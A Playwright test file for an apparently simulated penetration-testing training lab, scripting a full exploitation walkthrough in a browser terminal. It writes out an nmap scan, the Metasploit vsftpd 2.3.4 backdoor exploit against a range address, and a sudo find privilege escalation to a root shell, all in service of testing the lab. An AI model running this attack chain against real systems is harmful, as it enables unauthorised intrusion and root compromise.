import { test, expect } from "@playwright/test";

test.describe("NetRange Simulated Multi-Host Lab Engine", () => {
  test("completes scenario (a): single host foothold -> privesc end-to-end", async ({ page }) => {
    // 1. Authenticate and start attempt
    await page.goto("/start?next=/labs/netrange-foothold-privesc-01");
    await page.getByLabel("Choose your operator handle").fill(`netrange_${Date.now() % 1_000_000}`);
    await page.getByLabel("I have read and agree to the ethical use agreement").check();
    await page.getByRole("button", { name: "Start" }).click();
    await expect(page).toHaveURL(/\/labs\/netrange-foothold-privesc-01$/);

    // 2. Verify NetRange console banner & prompt
    const termScreen = page.locator(".xterm-screen");
    await termScreen.scrollIntoViewIfNeeded();
    await expect(page.locator(".xterm-rows")).toContainText("NetRange Engine");
    await expect(page.locator(".xterm-rows")).toContainText("kali@kali:~$");

    // Helper to send command to terminal
    const typeAndEnter = async (cmd: string) => {
      await termScreen.click();
      await page.waitForTimeout(50);
      await page.keyboard.type(cmd, { delay: 10 });
      await page.keyboard.press("Enter");
    };

    // 3. Service Enumeration via Nmap
    await typeAndEnter("nmap -sV 192.0.2.50");
    await expect(page.locator(".xterm-rows")).toContainText("vsftpd 2.3.4", { timeout: 10_000 });

    // 4. Offline Exploit lookup via Searchsploit
    await typeAndEnter("searchsploit vsftpd 2.3.4");
    await expect(page.locator(".xterm-rows")).toContainText("vsftpd 2.3.4 - Backdoor Command Execution", { timeout: 10_000 });

    // 5. Metasploit Exploitation
    await typeAndEnter("msfconsole");
    await expect(page.locator(".xterm-rows")).toContainText("metasploit", { timeout: 10_000 });

    await typeAndEnter("use exploit/unix/ftp/vsftpd_234_backdoor");
    await expect(page.locator(".xterm-rows")).toContainText("exploit(unix/ftp/vsftpd_234_backdoor)", { timeout: 10_000 });

    await typeAndEnter("set RHOSTS 192.0.2.50");
    await expect(page.locator(".xterm-rows")).toContainText("RHOSTS => 192.0.2.50", { timeout: 10_000 });
    await expect(page.locator(".xterm-rows")).toContainText("msf6 exploit(unix/ftp/vsftpd_234_backdoor) >", { timeout: 10_000 });

    await typeAndEnter("exploit");
    await expect(page.locator(".xterm-rows")).toContainText("Command shell session 1 opened", { timeout: 10_000 });
    await expect(page.locator(".xterm-rows")).toContainText("operator@apex-srv01", { timeout: 10_000 });

    // 6. Read Foothold Flag
    await typeAndEnter("cat /home/operator/flag.txt");
    await expect(page.locator(".xterm-rows")).toContainText("PENTEST{foothold_", { timeout: 10_000 });

    // Extract foothold flag from terminal text
    const termText1 = await page.locator(".xterm-rows").innerText();
    const matchFoothold = termText1.match(/PENTEST\{foothold_[a-f0-9]+\}/);
    expect(matchFoothold).not.toBeNull();
    const footholdFlag = matchFoothold![0];

    // Submit foothold flag
    await typeAndEnter(`submit 1 ${footholdFlag}`);
    await expect(page.locator("#objectives-heading ~ ol > li").nth(0).getByText("✓ Solved")).toBeVisible({ timeout: 10_000 });

    // 7. Local Privilege Escalation via Sudo GTFOBins
    await typeAndEnter("sudo -l");
    await expect(page.locator(".xterm-rows")).toContainText("NOPASSWD: /usr/bin/find", { timeout: 10_000 });

    await typeAndEnter("sudo find . -exec /bin/sh \\;");
    await expect(page.locator(".xterm-rows")).toContainText("root@apex-srv01", { timeout: 10_000 });

    // Read Root Flag
    await typeAndEnter("cat /root/flag.txt");
    await expect(page.locator(".xterm-rows")).toContainText("PENTEST{root_privesc_", { timeout: 10_000 });

    const termText2 = await page.locator(".xterm-rows").innerText();
    const matchRoot = termText2.match(/PENTEST\{root_privesc_[a-f0-9]+\}/);
    expect(matchRoot).not.toBeNull();
    const rootFlag = matchRoot![0];

    // Submit root flag
    await typeAndEnter(`submit 2 ${rootFlag}`);
    await expect(page.locator("#objectives-heading ~ ol > li").nth(1).getByText("✓ Solved")).toBeVisible({ timeout: 10_000 });

    // Lab completion message
    await expect(page.getByText("Lab complete! XP added to your profile.")).toBeVisible({ timeout: 10_000 });
  });

  test("ergonomics work at 390px mobile viewport without horizontal overflow", async ({ page }) => {
    await page.setViewportSize({ width: 390, height: 844 });
    await page.goto("/start?next=/labs/netrange-foothold-privesc-01");
    await page.getByLabel("Choose your operator handle").fill(`mob_${Date.now() % 1_000_000}`);
    await page.getByLabel("I have read and agree to the ethical use agreement").check();
    await page.getByRole("button", { name: "Start" }).click();
    await expect(page).toHaveURL(/\/labs\/netrange-foothold-privesc-01$/);

    // Verify mobile tactical elements
    await expect(page.getByText("MOBILE_READY")).toBeVisible();
    await expect(page.getByRole("button", { name: "TAB" })).toBeVisible();
    await expect(page.getByRole("button", { name: "EXEC" })).toBeVisible();

    // Verify touch targets >= 44px
    const execBtn = page.getByRole("button", { name: "EXEC" });
    const box = await execBtn.boundingBox();
    expect(box).not.toBeNull();
    expect(box!.height).toBeGreaterThanOrEqual(44);

    // Check no horizontal document overflow
    const scrollWidth = await page.evaluate(() => document.documentElement.scrollWidth);
    const clientWidth = await page.evaluate(() => document.documentElement.clientWidth);
    expect(scrollWidth).toBeLessThanOrEqual(clientWidth + 2);
  });
});
